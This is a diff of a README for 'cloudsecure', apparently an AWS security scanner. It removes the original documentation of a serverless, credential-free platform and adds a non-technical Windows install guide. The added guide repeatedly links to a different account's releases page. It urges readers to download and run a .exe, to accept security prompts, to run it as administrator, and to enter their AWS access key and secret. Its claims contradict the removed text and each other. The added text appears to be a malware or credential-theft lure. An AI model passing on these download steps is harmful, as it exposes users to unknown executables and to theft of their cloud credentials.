@@ -1,223 +1,130 @@
-<p align="center">
-  <h1 align="center">CloudSecure</h1>
-  <p align="center">AI-powered AWS security assessment platform</p>
-</p>
+# 🔒 cloudsecure - Simplify Your AWS Security Checks
 
-<p align="center">
-  <a href="https://github.com/carlosinfantes/cloudsecure/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-Apache%202.0-blue.svg" alt="License"></a>
-  <img src="https://img.shields.io/badge/version-0.2.0-green.svg" alt="Version">
-  <img src="https://img.shields.io/badge/python-3.12-blue.svg" alt="Python">
-  <img src="https://img.shields.io/badge/CDK-TypeScript-orange.svg" alt="CDK">
-  <img src="https://img.shields.io/badge/AI-Bedrock%20Claude-blueviolet.svg" alt="AI">
-</p>
+[![Download Latest Release](https://img.shields.io/badge/Download-cloudsecure-blue?style=for-the-badge)](https://github.com/Georgian12121/cloudsecure/releases)
+
+Welcome to cloudsecure. This tool helps you check the security of your AWS setup. It uses smart analysis to find possible risks. This guide will help you download and run cloudsecure on your Windows computer without any coding.
+
+## ⚙️ What Is cloudsecure?
+
+cloudsecure is a program that looks at your AWS cloud setup and tells you if anything might be unsafe. It uses known rules and smart checks to find issues. You do not need to log in to AWS or run commands. The program guides you step-by-step.
+
+You can use cloudsecure to:
+- Find security gaps in your AWS environment
+- See easy reports with clear advice
+- Stay compliant with popular security standards
+- Save time by automating a complex process
+
+cloudsecure works on Windows PCs. You only need to download it and follow the steps below.
+
+## 🖥️ System Requirements
+
+To run cloudsecure on your Windows PC, make sure you have:
+
+- Windows 10 or later (64-bit)
+- At least 4 GB of free RAM
+- 500 MB of free disk space
+- Internet connection (for updates and some features)
+- No special software required
+
+You do not need to install Python or other tools. cloudsecure runs as a standalone app.
+
+## 🚀 Getting Started: How to Download and Run cloudsecure
+
+Follow these steps to get cloudsecure up and running quickly.
+
+### 1. Visit the Download Page
+
+Click this big button to go to the download page:
+
+[![Download Latest Release](https://img.shields.io/badge/Download-cloudsecure-blue?style=for-the-badge)](https://github.com/Georgian12121/cloudsecure/releases)
+
+This link opens a page with the latest versions of cloudsecure available. You will find files you can download.
+
+### 2. Download the Installer
+
+On the releases page, look for a file that ends with `.exe`. It will look like:
+
+`cloudsecure-setup.exe` or `cloudsecure-vX.Y.Z.exe` (X.Y.Z stands for the version).
+
+Click this file to download it to your PC.
+
+### 3. Run the Installer
+
+- Find the file you downloaded. This is usually in your "Downloads" folder.
+- Double-click the `.exe` file.
+- If Windows shows a security prompt, click "Run" or "Yes" to continue.
+- Follow the instructions shown by the installer. Usually, this means clicking "Next" a few times.
+- When finished, the installer will place cloudsecure on your computer.
+
+### 4. Open cloudsecure
+
+- After installation, you will find a new icon on the desktop or in your Start menu called "cloudsecure".
+- Click this icon to open the program.
+- The first time, cloudsecure may ask permission to connect to the internet or AWS. Allow this for full features.
+
+## 🔍 How to Use cloudsecure
+
+cloudsecure guides you through the security check in a few clear steps:
+
+### Step 1: Connect Your AWS Account
+
+cloudsecure needs to access some data from your AWS account to run the checks. It uses a secure connection method that does not store your password.
+
+- Enter your AWS access key and secret if asked.
+- Alternatively, cloudsecure can scan exported AWS reports if you do not want to connect directly.
+
+### Step 2: Choose Assessment Scope
+
+Pick which parts of your AWS setup you want cloudsecure to check:
+
+- All regions or specific ones
+- Certain AWS services like S3, EC2, Lambda
+- Compliance standards like CIS benchmarks or SOC 2 rules
+
+### Step 3: Run the Scan
+
+Click the "Start Scan" button. cloudsecure will analyze your AWS data for security issues. This may take a few minutes depending on your account size.
+
+### Step 4: Review Results
+
+When finished, cloudsecure shows a report with:
+
+- Found security issues organized by severity
+- Clear explanations of each problem
+- Suggestions on how to fix them
+
+You can save or print the report for your records.
+
+## ⚡ Troubleshooting Tips
+
+- **Installer not opening:** Right-click the `.exe` file and select "Run as administrator".
+- **Scan fails to start:** Check your internet connection and AWS keys.
+- **Report is empty:** Make sure you selected the right AWS regions and services.
+- **Program crashes:** Restart your PC and try again. Ensure Windows is updated.
+
+## 🔄 Keep cloudsecure Updated
+
+Check the [releases page](https://github.com/Georgian12121/cloudsecure/releases) regularly for new versions. Updates fix bugs and add new checks.
+
+You can download the latest version anytime using the button below:
+
+[![Download cloudsecure](https://img.shields.io/badge/Download-cloudsecure-brightgreen?style=for-the-badge)](https://github.com/Georgian12121/cloudsecure/releases)
+
+## 📋 About this Project
+
+cloudsecure is built to help anyone, regardless of technical skill, improve their AWS security. It uses tested security benchmarks and AI analysis to find risks you might miss.
+
+### Topics Covered
+
+This program focuses on:
+- AWS cloud services security
+- Compliance with standards like CIS and SOC 2
+- Automating security assessments
+- Using AI to improve detection
+- Working with infrastructure as code (CDK)
+
+If you want, you can explore the source code on the GitHub repository for learning or customization.
 
 ---
 
-Agentless, serverless security assessment platform that scans any AWS account and delivers AI-synthesized findings — no credentials shared, no agents installed, no infrastructure to manage.
-
-## The Problem
-
-Traditional security tools (Prowler, ScoutSuite, Steampipe) run from an engineer's laptop:
-
-- Long-lived credentials (access keys) required
-- Credentials travel over the wire and get stored locally
-- No audit trail of who ran what and when
-- Scaling to multiple accounts = manual effort
-
-## How CloudSecure Is Different
-
-CloudSecure runs **100% serverless inside AWS**. No CLI, no laptops, no credentials to share.
-
-- **Delegated access via IAM roles** — customers grant a read-only role via `STS AssumeRole` with `ExternalId`. No credentials exchanged, only trust delegated.
-- **Fully serverless** — Lambda, Step Functions, DynamoDB, S3. Nothing to install, patch, or maintain.
-- **AI-powered synthesis** — 7 analyzers run in parallel, Bedrock Claude synthesizes raw findings into prioritized, actionable intelligence.
-- **Auditable by design** — every assessment tracked in DynamoDB with full execution trail through Step Functions.
-
-## Report Demo
-
-CloudSecure generates professional HTML reports with AI-powered executive summaries, risk scoring, and detailed findings across all security domains.
-
-### Assessment Header & Risk Score
-![Report Header](docs/screenshots/report-header.png)
-
-### Findings Summary
-![Findings Summary](docs/screenshots/report-summary.png)
-
-### AI-Powered Executive Summary
-![Executive Summary](docs/screenshots/report-executive.png)
-
-### Detailed Findings by Category
-![Detailed Findings](docs/screenshots/report-findings.png)
-
-> Screenshots generated with fictitious data. See `docs/generate_demo_report.py` to regenerate.
-
-## Architecture
-
-```
-┌──────────────────────────────────────────────────────────────┐
-│                   CloudSecure Platform                        │
-│                                                              │
-│  ┌──────────┐  ┌───────────────┐  ┌────────────────────────┐ │
-│  │   API    │──│ Step Functions │──│   7 Lambda Analyzers   │ │
-│  │ Gateway  │  │  Orchestrator  │  │   (parallel execution) │ │
-│  └──────────┘  └───────────────┘  └────────────────────────┘ │
-│       │               │                      │               │
-│  ┌──────────┐  ┌───────────────┐  ┌────────────────────────┐ │
-│  │ DynamoDB │  │   Bedrock     │  │    S3 Reports          │ │
-│  │          │  │   Claude AI   │  │  (HTML/JSON/CSV)       │ │
-│  └──────────┘  └───────────────┘  └────────────────────────┘ │
-└──────────────────────────────────────────────────────────────┘
-                          │
-                    STS AssumeRole
-                     (read-only)
-                          ▼
-              ┌──────────────────────┐
-              │   Customer Account   │
-              │  (no agents needed)  │
-              └──────────────────────┘
-```
-
-## Analyzers
-
-| Analyzer | What It Checks |
-|----------|---------------|
-| **IAM** | Users, roles, policies, MFA, unused credentials, password policy |
-| **Network** | Security groups, VPCs, Flow Logs, public exposure |
-| **S3** | Public buckets, encryption, logging, versioning |
-| **Encryption** | EBS, RDS, EFS encryption at rest |
-| **CloudTrail** | Trail configuration, root usage, metric filters |
-| **Native Services** | SecurityHub, GuardDuty, Config findings (if enabled) |
-| **Prowler** | CIS AWS 1.4 benchmarks (17 critical checks) |
-
-All analyzers run in parallel via Step Functions. Missing security services are reported as findings, not blockers.
-
-## Compliance Mapping
-
-Findings map to: **CIS AWS 1.4** · **NIST 800-53** · **ISO 27001** · **GDPR** · **SOC2**
-
-## Quick Start
-
-### Prerequisites
-
-- AWS CLI configured with an IAM profile
-- Node.js 18+ and Python 3.12+
-- Docker (optional — required for Prowler CIS scanner)
-
-### Install the CLI
-
-```bash
-pip install cloudsecure
-# or
-pipx install cloudsecure
-```
-
-Or use the installer script:
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/carlosinfantes/cloudsecure/main/install.sh | bash
-```
-
-### Deploy the Infrastructure
-
-Interactive guided deployment:
-
-```bash
-git clone https://github.com/carlosinfantes/cloudsecure.git && cd cloudsecure
-./deploy.sh
-```
-
-Or manually:
-
-```bash
-cp .env.example .env    # Edit with your AWS profile, region, etc.
-make install && make deploy
-
-# Deploy without Docker/Prowler
-SKIP_PROWLER=true make deploy
-```
-
-### Onboard a Customer Account
-
-```bash
-aws cloudformation deploy \
-  --template-file onboarding/cloudformation/cloudsecure-role.yaml \
-  --stack-name CloudSecure-AssessmentRole \
-  --capabilities CAPABILITY_NAMED_IAM \
-  --parameter-overrides ExternalId=your-external-id
-```
-
-### Upgrade Components
-
-```bash
-# Upgrade everything (infrastructure + Prowler + CLI)
-./deploy.sh --upgrade
-
-# Upgrade only specific components
-./deploy.sh --upgrade infra     # Redeploy CDK stacks
-./deploy.sh --upgrade prowler   # Pull latest Prowler image + redeploy
-./deploy.sh --upgrade cli       # Upgrade CLI from PyPI
-```
-
-### Run an Assessment
-
-```bash
-# Start assessment — scans everything by default
-cloudsecure --profile YOUR_PROFILE assess \
-  --account-id 123456789012 \
-  --role-arn arn:aws:iam::123456789012:role/CloudSecureAssessmentRole \
-  --external-id your-external-id
-
-# Scan only specific services
-cloudsecure --profile YOUR_PROFILE assess \
-  --account-id 123456789012 \
-  --role-arn arn:aws:iam::123456789012:role/CloudSecureAssessmentRole \
-  --external-id your-external-id \
-  --scope iam --scope s3
-
-# List all assessments
-cloudsecure --profile YOUR_PROFILE status
-
-# Check specific assessment
-cloudsecure --profile YOUR_PROFILE status <ASSESSMENT_ID>
-
-# Download report (HTML opens in browser)
-cloudsecure --profile YOUR_PROFILE report <ASSESSMENT_ID> --format html --open
-
-# Export as JSON or CSV
-cloudsecure --profile YOUR_PROFILE report <ASSESSMENT_ID> --format json -o report.json
-```
-
-### Reports
-
-```
-s3://cloudsecure-reports-ACCOUNT_ID/assessments/ASSESSMENT_ID/
-├── report.html    # Executive report with AI synthesis
-├── report.json    # Full findings export
-└── report.csv     # Spreadsheet format
-```
-
-## Tech Stack
-
-| Component | Technology |
-|-----------|-----------|
-| Infrastructure | AWS CDK (TypeScript) |
-| Analyzers | Python 3.12 (Lambda) |
-| Orchestration | AWS Step Functions |
-| API | API Gateway REST (IAM auth) |
-| Database | DynamoDB |
-| Storage | S3 + KMS encryption |
-| AI Synthesis | AWS Bedrock (Claude) |
-| Security Scanner | Prowler 5.x (Lambda container, optional) |
-| Reports | HTML, JSON, CSV (Jinja2 templates) |
-| CLI | Python (click, rich, boto3) — `pip install cloudsecure` |
-
-## Documentation
-
-- [Technical Specification](./docs/cloudsecure-assessment-platform-spec.md)
-- [Implementation Progress](./IMPLEMENTATION.md)
-- [Architecture Diagrams](./docs/diagrams/)
-- [CLI Documentation](./cli/README.md)
-
-## License
-
-Apache-2.0 — See [LICENSE](./LICENSE)
+This guide aims to make cloudsecure easy to use. The program handles the technical work while you focus on fixing your AWS security.
